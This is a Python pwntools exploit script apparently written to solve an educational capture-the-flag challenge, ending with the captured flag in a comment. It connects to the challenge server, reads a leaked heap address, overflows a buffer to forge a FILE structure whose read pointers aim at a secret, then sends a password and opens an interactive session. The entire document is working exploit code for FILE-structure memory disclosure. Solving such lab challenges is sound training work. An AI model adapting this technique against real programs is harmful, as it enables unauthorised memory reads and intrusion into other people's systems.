from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
context.log_level = "debug"

# io = gdb.debug("./chal", "c")
io = remote("edu-ctf.zoolab.org", 30216)
io.recvuntil(b"for you: ")
note_addr = int(io.recvlineS().strip(), 16)
secret_addr = note_addr - 0x30
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", b"2")
io.sendlineafter(
    b"data> ",
    b"a" * 0x200
    + flat([0, 0x1E0])
    + flat(
        [
            0xFBAD0000,
            0,
            0,
            0,
            0,
            0,
            0,
            secret_addr,
            secret_addr + 0x20,
            0,
            0,
            0,
            0,
            0,
            0,
        ]
    ),
)
io.sendlineafter(b"> ", b"4")
io.sendline(b"gura_50_cu73\0")
io.interactive()

# FLAG{600d_mu51c_53r135_p4r7_2_youtu.be/g0lQESej9zc}
